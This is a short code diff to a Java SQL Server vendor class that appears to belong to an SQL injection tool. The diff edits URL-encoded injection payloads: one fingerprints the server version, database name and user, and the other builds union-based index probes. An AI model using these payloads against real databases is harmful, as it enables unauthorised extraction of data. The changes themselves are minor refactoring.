@@ -22,7 +22,7 @@ public class SQLServerVendor extends AbstractVendor {
     @Override
     public String getSqlInfos() {
         return
-            "SELECT+@@version%2B'%04'%2BDB_NAME()%2B'%04'%2Buser%2B'%04'%2Buser_name()%2B'%01%03%03%07'";
+            "SELECT+@@version%2B'%04'%2BDB_NAME()%2B'%04'%2Buser%2B'%01%03%03%07'";
     }
 
     @Override
@@ -167,7 +167,7 @@ public class SQLServerVendor extends AbstractVendor {
     @Override
     public String getSqlIndicesCapacityCheck(String[] indexes) {
         return
-            MediatorModel.model().indexesInUrl.replaceAll(
+            MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
                 "(select+concat('SQLi$1',replicate(0x23,1024),'iLQS'))"
             );
